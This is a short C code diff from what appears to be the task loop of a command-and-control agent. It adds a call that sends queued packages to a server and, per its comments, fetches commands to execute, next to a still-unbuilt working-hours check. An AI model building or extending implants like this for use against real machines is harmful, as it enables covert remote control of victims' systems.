@@ -1,10 +1,11 @@
 #include "TaskController.h"
 #include "parser.h"
+#include "package.h"
 
 VOID PerformTask(pAgent agent) {
 
     PARSER   Parser = { 0 };
-    LPVOID   DataBuffer = { 0 };
+    DataBuffer   Buffer = { 0 };
     SIZE_T   DataBufferSize = { 0 };
     PARSER   TaskParser = { 0 };
     LPVOID   TaskBuffer = { 0 };
@@ -25,6 +26,10 @@ VOID PerformTask(pAgent agent) {
         //TODO BUILD WORKING HOURS CHECK.
 
         //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
+        if (!PackageSendAll(agent, &Buffer, &DataBufferSize))
+        {
+            exit(-1);
+        }
     }
 
 	
